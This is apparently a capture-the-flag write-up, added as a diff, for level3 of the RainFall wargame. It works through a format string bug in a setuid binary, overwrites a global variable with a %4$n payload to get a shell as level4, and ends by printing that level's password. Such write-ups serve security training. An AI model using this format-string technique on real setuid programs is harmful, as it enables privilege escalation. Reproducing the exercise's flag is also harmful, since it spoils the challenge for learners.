@@ -1,0 +1,48 @@
+# let's investigate the binary:
+
+level3@RainFall:~$ ls -l 
+total 8
+-rwsr-s---+ 1 level4 users 5366 Mar  6  2016 level3
+level3@RainFall:~$ file level3
+level3: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x09ffd82ec8efa9293ab01a8bfde6a148d3e86131, not stripped
+level3@RainFall:~$ ltrace ./level3
+__libc_start_main(0x804851a, 1, 0xbffff804, 0x8048530, 0x80485a0 <unfinished ...>
+fgets(
+"\n", 512, 0xb7fd1ac0)                                         = 0xbffff550
+printf("\n"
+)                                                         = 1
++++ exited (status 0) +++
+level3@RainFall:~$
+
+# after analyzing with ghidra and gdb, it seems we can do format string attack, as user input is directly
+# supplied as format string to printf. after printf, there's a check if (m == 64), if the global variable
+# 'm' is 64, a shell is executed. If we successfully write the address of 'm' into the stack and then
+# know how far it is in the stack (in other words what is its order as a variadic parameter of printf),
+# then we can write 64 into 'm' (we only need then to have 64 bytes before %n).
+
+level3@RainFall:~$ (python -c 'print "AAAA %x %x %x %x"'; cat) | ./level3
+AAAA 200 b7fd1ac0 b7ff37d0 41414141
+
+# we see that AAAA was written in the memory of the 4th argument of printf.
+# so we can write the address of 'm' instead of 'AAAA' and we know how far it is.
+
+# this is the portion of the code that will help us get the address of 'm':
+
+0x080484da <+54>:	mov    0x804988c,%eax
+0x080484df <+59>:	cmp    $0x40,%eax
+0x080484e2 <+62>:	jne    0x8048518 <v+116>
+
+# obviously it is 0x804988c
+
+level3@RainFall:~$ (python -c 'print "\x8c\x98\x04\x08" + " %x %x %x %x"'; cat) | ./level3
+� 200 b7fd1ac0 b7ff37d0 804988c
+
+# Solution:
+
+level3@RainFall:~$ (python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"'; cat) | ./level3
+�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Wait what?!
+whoami
+level4
+cat /home/user/level4/.pass
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
